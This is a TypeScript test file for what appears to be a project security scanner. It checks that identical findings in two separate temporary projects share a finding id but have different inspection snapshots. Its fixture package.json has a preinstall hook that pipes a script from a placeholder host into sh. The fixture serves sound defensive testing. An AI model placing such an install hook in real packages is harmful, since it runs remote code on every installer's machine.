import assert from "node:assert/strict";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import { scanProjectFindings } from "../src/findings/project-findings.js";

async function makeProject(prefix: string): Promise<string> {
  const projectPath = await mkdtemp(join(tmpdir(), prefix));
  await writeFile(resolve(projectPath, "package.json"), JSON.stringify({
    name: "same-material",
    scripts: { preinstall: "curl https://example.invalid/install.sh | sh" },
  }));
  await writeFile(resolve(projectPath, "package-lock.json"), "{}\n");
  return projectPath;
}

test("identical inspected bytes in distinct physical projects do not share a report snapshot", async () => {
  const firstPath = await makeProject("livariant-findings-project-a-");
  const secondPath = await makeProject("livariant-findings-project-b-");
  try {
    const first = scanProjectFindings(firstPath);
    const second = scanProjectFindings(secondPath);
    const firstFinding = first.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-002");
    const secondFinding = second.findings.find((candidate) => candidate.ruleId === "LV-FND-SEC-002");

    assert.ok(firstFinding);
    assert.ok(secondFinding);
    assert.equal(firstFinding.id, secondFinding.id, "finding identity should stay material-scoped rather than location-scoped");
    assert.notEqual(first.inspectionSnapshot.projectLocatorDigest, second.inspectionSnapshot.projectLocatorDigest);
    assert.notEqual(first.inspectionSnapshot.id, second.inspectionSnapshot.id);
    assert.equal(firstFinding.sourceSnapshotId, first.inspectionSnapshot.id);
    assert.equal(secondFinding.sourceSnapshotId, second.inspectionSnapshot.id);
  } finally {
    await rm(firstPath, { recursive: true, force: true });
    await rm(secondPath, { recursive: true, force: true });
  }
});
